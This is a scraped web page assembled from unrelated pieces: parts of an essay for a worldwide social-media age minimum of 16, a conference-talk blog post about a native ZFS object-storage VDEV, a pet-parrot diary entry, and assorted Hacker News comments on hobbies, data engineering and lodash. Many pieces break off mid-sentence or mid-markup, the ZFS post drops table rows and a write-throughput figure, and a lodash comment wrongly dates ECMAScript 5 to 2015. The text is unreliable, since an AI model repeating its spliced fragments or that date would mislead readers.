data-component-name="ButtonCreateButton"><a href="https://www.afterbabel.com/p/why-every-country-should-set-16?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p><span>Parents everywhere have heard their children invoke the mantra “but everyone else has one! I’m being left out!” in their daily struggles over smartphones, tablets, social media, video games, and other screen-based activities. And the kids are largely correct. Now that almost everyone else has one, everyone feels that they, too, have to have one. That’s a perfect example of what economists call a </span><a href="https://bfi.uchicago.edu/wp-content/uploads/2023/10/BFI_WP_2023-131.pdf" rel="">collective action trap</a><span>, where everyone ends up doing something sub-optimal because if they were the only one to choose the better action, they’d actually end up even worse off.</span></p><p>The way to escape from a collective action trap is collectively. If most families only give basic phones before age 14, then no 13-year-old can say “but I’m the only one who doesn’t have an iPhone!” If most families wait until 16 before allowing their kids to open social media accounts, that would also reduce the pressure on everyone younger than that to open a social media account.</p><p>But while parents can choose the age at which their child gets a phone, no parent has full control over when their child opens social media accounts. If the child can get to the internet anywhere, including at school, she can open as many accounts as she likes as long as she’s old enough to say she’s 13.</p><p>This is why parents need help from their governments, and from the platforms (which have shown repeatedly that they will not protect children unless forced to by law). This is why the Australian law is so important: It delays the struggle over social media until the age of 16.</p><p><span>Any country that adds in a provision for parental consent at younger ages plunges everyone back into the collective action trap. We’re right back to “But all of my friends’ parents gave </span><em>them</em><span> permission!”</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-184377434" href="https://www.afterbabel.com/p/why-every-country-should-set-16#footnote-1-184377434" target="_self" rel="">1</a></span></p><p><span>A third consideration is that simple rules are generally best for a complex world, as legal scholars </span><a href="https://www.hup.harvard.edu/books/9780674808218" rel="">Richard Epstein</a><span> and </span><a href="https://www.penguinrandomhouse.com/books/83456/the-death-of-common-sense-by-philip-k-howard/" rel="">Philip Howard</a><span> have long argued. People understand and remember them. They are easier to enforce. And for social media — by its nature international and placeless — a patchwork quilt of different age and parental-permission rules means that underage kids could (and many will) use a VPN to find a country in which they can easily open a social media account.</span></p><p>As a bonus, a simple and widespread age limit of 16 would be much easier for social media platforms to enforce effectively. They don’t want different rules across different countries.

Phone-free school policies have been widely </span><a href="https://docs.google.com/document/d/1rfPGAxYc-fx9Z6OF2fmhmovpWg0sISb-N0XNq_BDzfY/edit?tab=t.0" rel="">successful</a><span> across many jurisdictions.</span></p><p>So, as countries and states consider following Australia’s lead in 2026, we want to offer a similar set of features for an ideal social media age-limit policy. </p><p><span>As discussed previously, protecting children during puberty is essential. Social media is wildly inappropriate for children and younger adolescents. </span><a href="https://storage.courtlistener.com/recap/gov.uscourts.nmd.496039/gov.uscourts.nmd.496039.36.2.pdf" rel="">One internal Instagram study found that</a><span> 11% of 13-15 year olds reported being a target of bullying, 13% reported receiving an unwanted sexual advance, 19% reported seeing unwanted sexually explicit content, and 21% reported seeing posts that made them feel worse about themselves </span><strong>every seven days</strong><span>. In a </span><a href="https://www.pewresearch.org/internet/2025/04/22/teens-social-media-and-mental-health/" rel="">recent Pew poll</a><span>, 45% of teens reported that they themselves felt they used social media too much with many suggesting that it affects their sleep and their grades. Fifteen is too young. It also undercuts the power of the norm in countries that set it to 16.</span></p><p>Don’t make parents’ jobs even harder by giving their kids one more thing to beg for. Setting a single, clear age minimum with no loopholes does parents a favor. Imagine if every child could plead with their parents to get a drivers license at any age. Governments routinely set minimum ages for products and activities that could harm or exploit children, such as driving a car, signing up for a credit card, or drinking alcohol — social media is no different. Keep the policy simple and uniform for everyone and make parenting a little bit easier for us all.</p><p><span>Setting age-limit policies based on content (what kinds of things kids see) prompts never-ending debates about what content is inappropriate for children (e.g., what counts as too sexually explicit, how violent is too violent?, etc.). It can also lead to charges of content-based or viewpoint-based censorship. This is why we recommend orienting the law not around content but around the age at which minors can sign contracts with companies in which they agree to give away personal data and expose themselves fully to the company’s addictive algorithms, without their parents’ knowledge or consent. We think it is important to allow logged-off access to content, as </span><a href="https://www.afterbabel.com/p/australia-social-meda-minimum-age-misunderstood" rel="">Australia’s policy does</a><span>. Children under 16 can still search sites such as YouTube for whatever content they want. They can easily view any video that a teacher assigns or a friend recommends. But if they do not have an account and have not signed a contract with the company, then they cannot compare the popularity of pictures of themselves, receive tailored late night notifications, be served more and more extreme content, or be contacted by strangers via messaging. Without this inappropriate business relationship and access to the extensive data they currently collect from kids, companies will find it much harder to train algorithms and use design features to manipulate and exploit kids.</span></p><p><span>While several platforms are currently the obvious targets of legislation because of the outsized role they play in kids’ lives, any definition of “social media” will inevitably invite challenges by companies who host different activities and have varied feature sets. By focusing on </span><a href="https://docs.google.com/spreadsheets/d/1GVO7sNuCNmNwqVK64PHQI7wxd8-Gmr9PqdkW12elmus/edit?gid=941162555#gid=941162555" rel="">the design features</a><span> that cause harm, we can capture video-game platforms that facilitate adult/minor solicitation and video-hosting platforms that maximize engagement through algorithms. Platforms that do not need these potentially harmful features will want to avoid the increased regulation and risk, and will therefore have an incentive to keep them out.</span></p><p data-attrs="{&quot;url&quot;:&quot;https://www.afterbabel.com/p/why-every-country-should-set-16?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.afterbabel.com/p/why-every-country-should-set-16?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p><span>We would love to take credit for the success of phone-free school policies, and for the growing international interest in social media age-limit policies. The reality is, though, that these policies and ideas succeed because they address something that most parents, teachers, and children experience every day: the technology-facilitated manipulation of one of our most precious resources — the time and attention of our kids. Policymakers, parents, and kids themselves are fighting back. In fact, on the </span><em>New York Times</em><span> tech podcast </span><em><a href="https://www.nytimes.com/2025/12/12/podcasts/hardfork-australia-water.html" rel="">Hard Fork</a></em><span>, co-host Casey Newton offered his number-one prediction for a 2026 tech trend:</span></p><blockquote><p><em>Sixteen plus becomes the new norm for social media accounts worldwide… by the end of 2026 we’ve seen at least five other democracies introduce similar rules.</em></p></blockquote><p>Bravo to Australia, and bravo to the five (or more) countries that will turn Australia’s bold move into a new international standard.

<div id="readability-page-1" class="page"><div>

          <p>
            We presented MayaNAS and MayaScale at OpenZFS Developer Summit 2025 in Portland, Oregon. The centerpiece of our presentation: <strong>objbacker.io</strong>—a native ZFS VDEV implementation for object storage that bypasses FUSE entirely, achieving 3.7 GB/s read throughput directly from S3, GCS, and Azure Blob Storage.
          </p>

          <h2 id="introduction">Presenting at OpenZFS Summit</h2>
          <p>
            The OpenZFS Developer Summit brings together the core developers and engineers who build and maintain ZFS across platforms. It was the ideal venue to present our approach to cloud-native storage: using ZFS's architectural flexibility to create a hybrid storage system that combines the performance of local NVMe with the economics of object storage.
          </p>

          <p>
            Our 50-minute presentation covered the complete Zettalane storage platform—MayaNAS for file storage and MayaScale for block storage—with a deep technical dive into the objbacker.io implementation that makes ZFS on object storage practical for production workloads.
          </p>

          <h2 id="challenge">The Cloud NAS Challenge</h2>
          <p>
            Cloud storage economics present a fundamental problem for NAS deployments:
          </p>

          <div>
            <div>
                <h3>$96K/year</h3>
                <p>100TB on EBS (gp3)</p>
              </div>
            <div>
                <h3>$360K/year</h3>
                <p>100TB on AWS EFS</p>
              </div>
          </div>

          <p>
            The insight that drives MayaNAS: not all data needs the same performance tier. Metadata operations require low latency and high IOPS. Large sequential data needs throughput, not IOPS. ZFS's special device architecture lets us place each workload on the appropriate storage tier.
          </p>

          <p><strong>ZFS Special Device Architecture:</strong> Metadata and small blocks (&lt;128KB) on local NVMe SSD. Large blocks (1MB+) streamed from object storage. One filesystem, two performance tiers, optimal cost.
          </p>

          <h2 id="objbacker">objbacker.io: Native ZFS VDEV for Object Storage</h2>
          <p>
            The traditional approach to ZFS on object storage uses FUSE-based filesystems like s3fs or goofys to mount buckets, then creates ZFS pools on top. This works, but FUSE adds overhead: every I/O crosses the kernel-userspace boundary twice.
          </p>

          <p>
            <strong>objbacker.io takes a different approach.</strong> We implemented a native ZFS VDEV type (<code>VDEV_OBJBACKER</code>) that communicates directly with a userspace daemon via a character device (<code>/dev/zfs_objbacker</code>). The daemon uses native cloud SDKs (AWS SDK, Google Cloud SDK, Azure SDK) for direct object storage access.

          <h2 id="how-it-works">How objbacker.io Works</h2>
          <p>
            objbacker.io is a Golang program with two interfaces:
          </p>

          <ul>
            <li><strong>Frontend:</strong> ZFS VDEV interface via <code>/dev/zfs_objbacker</code> character device</li>
            <li><strong>Backend:</strong> Native cloud SDK integration for GCS, AWS S3, and Azure Blob Storage</li>
          </ul>

          <h3>ZIO to Object Storage Mapping</h3>
          <table>
            <thead>
              <tr>
                <th>ZFS VDEV I/O</th>
                <th>/dev/objbacker</th>
                <th>Object Storage</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>ZIO_TYPE_WRITE</td>
                <td>WRITE</td>
                <td>PUT object</td>
              </tr>
              <tr>
                <td>ZIO_TYPE_READ</td>
                <td>READ</td>
                <td>GET object</td>
              </tr>
              <tr>
                <td>ZIO_TYPE_TRIM</td>

              <tr>

              </tr>
            </tbody>
          </table>

          <h3>Data Alignment</h3>
          <p>
            With ZFS recordsize set to 1MB, each ZFS block maps directly to a single object. Aligned writes go directly as PUT requests without caching. This alignment is critical for performance—object storage performs best with large, aligned operations.
          </p>

          <p><strong>Object Naming:</strong> S3backer-compatible layout. A 5MB file creates 5 objects at offsets 0, 1MB, 2MB, 3MB, 4MB. Object names: <code>bucket/00001</code>, <code>bucket/00002</code>, etc.
          </p>

          <h2 id="performance">Validated Performance Results</h2>
          <p>
            We presented benchmark results from AWS c5n.9xlarge instances (36 vCPUs, 96 GB RAM, 50 Gbps network):
          </p>

          <div>
            <div>
                <h3>3.7 GB/s</h3>
                <p>Sequential Read from S3</p>
              </div>
            <div>

                <p>Sequential Write to S3</p>
              </div>
          </div>

          <p>
            The key to this throughput: parallel bucket I/O. With 6 S3 buckets configured as a striped pool, ZFS parallelizes reads and writes across multiple object storage endpoints, saturating the available network bandwidth.
          </p>

          <h2 id="conclusion">Conclusion</h2>
          <p>
            Presenting at OpenZFS Developer Summit 2025 gave us the opportunity to share our approach with the community that makes ZFS possible. The key technical contribution: objbacker.io demonstrates that native ZFS VDEV integration with object storage is practical and performant, achieving 3.7 GB/s throughput without FUSE overhead.
          </p>

          <p>
            MayaNAS with objbacker.io delivers enterprise-grade NAS on object storage with 70%+ cost savings versus traditional cloud block storage. MayaScale provides sub-millisecond block storage with Active-Active HA for latency-sensitive workloads. Together, they cover 90% of enterprise storage needs on any major cloud platform.
          </p>

          <p>
            Special thanks to the OpenZFS community for the foundation that makes this possible.

<div><p>I found out my crimson-bellied conure is laying an egg today! She's nesting in some towels now, chirping away while she works on laying it.</p><p>Having an egg is relatively hard on parrots. I've given her lots of food and warmth to prepare. She is comically hungry -- she's usually not such a big eater, but she's happy today to be scarfing down her apple slices, fruit pellets, and safflower seeds.</p><p>She usually sleeps at the bottom of her cage, beneath a towel I put down for her. It's already unusual for parrots! But tonight she has made quite a nest with her towel: It's folded in half like usual, but she has nuzzled her way between the fold, so she has the towel underneath and on top of her. It's super cute.</p><p>I'm treating her with delicacy but she is determined to be a wild child of a bird. She's still flying around during the day and moving around plenty. I don't think I would be so confident if I had an egg like that inside me.</p><p>She has a stone perch that she likes to nibble on when she's working on an egg. I've wondered if it is some innate need to nourish herself with calcium, or if it's stress relief :)</p><p>So that's my night. Sitting outside of the metaphorical delivery ward with a metaphorical cigar, making sure she lays this egg that isn't even fertile to begin with!

<div><p>Thanks a lot! Yes, I agree that it is easier with physical books although even there I can already see that I may be painting myself into a corner.

But over time I have realized that I have so many of them on my kindle and always seems to find new ones rather than finishing existing.</p><p>With regards to cameras, I also came to Fuji although from Nikon. But I agree, the important part is getting better at photography and the better you know your camera the more it can become an extension of yourself.</p><p>There is just something very alluring about the daydream of having the new camera and taking those "perfect" images.

Beyond 3 years of fermentation, you get diminishing returns as its flavor becomes too acidic.</p><p>After the tour, we got to sample some of the naturally fermented 3 years old miso, and it was easily the best I've ever had.

The few I bought weren’t certified or anything, but they have lots of very well established sellers. I got a few bronze and silver coins from the Middle East and India. They were in good shape at about $10-20 US (plus international shipping). I also got some nicer Byzantine and Roman coins in the $50 US price range. I tried to group my orders from each seller to save on shipping. So far everything I’ve gotten is exactly as pictured, and the transactions have been very smooth. I got a couple more from a local dealer. The prices were a bit higher, but he was a lot of fun to talk to, which more than makes up for the price difference.</p></div></td></tr></tbody></table></td></tr><tr id="46629548"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46629548" href="https://news.ycombinator.com/vote?id=46629548&amp;how=up&amp;goto=item%3Fid%3D46619464"></a></center></td><td><br>

<div><p>I've been exploring kefir.

I've been trying to remove UPF foods from my daily consumption, trying to lower the ratio of them I eat (the average is supposedly 60% for adults in my country), since the academic link between UPF and dementia is quite strong now.

<div><p>I had a great euphoric epiphany feeling today.  Doesn't come along too often, will celebrate with a nice glass of wine :)</p><p>Am doing data engineering for some big data (yeah, big enough) and thinking about efficiency of data enrichment.  There's this classic trilemma with data enrichment where you can have good write efficiency, good read efficiency and/or good storage cost, pick two.</p><p>E.g. you have a 1TB table and you want to add a column that, say, will take 1GB to store.</p><p>You can create a new table that is 1.1TB and then delete the old table, but this is both write-inefficient and often breaks how normal data lake orchestration works.</p><p>You can create a new wide table that is 1.1TB and keep it along side the old table, but this is both write-inefficient and expensive to store.</p><p>You can create a narrow companion table that has just a join key and 1GB of data.  This is efficient to write and store, but inefficient to query when you force all users to do joins on read.</p><p>And I've come up with a cunning forth way where you write a narrow table and read a wide table so its literally best of all worlds!  Kinda staggering :)  Still on a high.</p><p>Might actually be a conference paper, which is new territory for me.

<div><p>Another fun fact - lodash/fp doesn't deduplicate with lodash when bundled. For a couple of months I was wondering why our app had bundled two copies of lodash.

<div><p>I'm guessing you're only a few years into your web career, so I'll provide some background. lodash is a popular library that fills in many blanks that pre-2015 JavaScript had. It still provides value in modern JavaScript, but it's no longer as important as it used to be.</p><p>JavaScript is actually based on a standard called ECMAScript. ActionScript shares this standard, as an example. In 2015, we got ECMAScript 5, which modernized JavaScript in many ways. With that came many changes such as ECMAScript moving to a yearly update cadence, in response to the large amount of effort involved in implementing ES5, which came with a ton of changes.</p><p>One of those changes was ES modules, or ESM, which provided an official way for working with modules. The import/export syntax you're used to is a part of that spec. Before this, we had competing non-standard specifications for module loading, such as CommonJS.</p><p>ES5 reduced the need for tools such as lodash, and so it's less common in newer projects. It also is old enough to have been around before ESM was adopted, and is a large project, and so like many projects it either had to completely rewrite everything, or use transformation tools such as babel. If not, the user was responsible for using babel/etc to transform the code. Now, in modern stacks, because this is unnecessary, native support for CommonJS is being phased out, leading to OP's conundrum.</p><p>Now we have TypeScript, and the horrors of JavaScript 10+ years ago are a fading memory.</p></div></td></tr></tbody></table></td></tr><tr id="46629884"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_46629884" href="https://news.ycombinator.com/vote?id=46629884&amp;how=up&amp;goto=item%3Fid%3D46619464"></a></center></td><td><br>
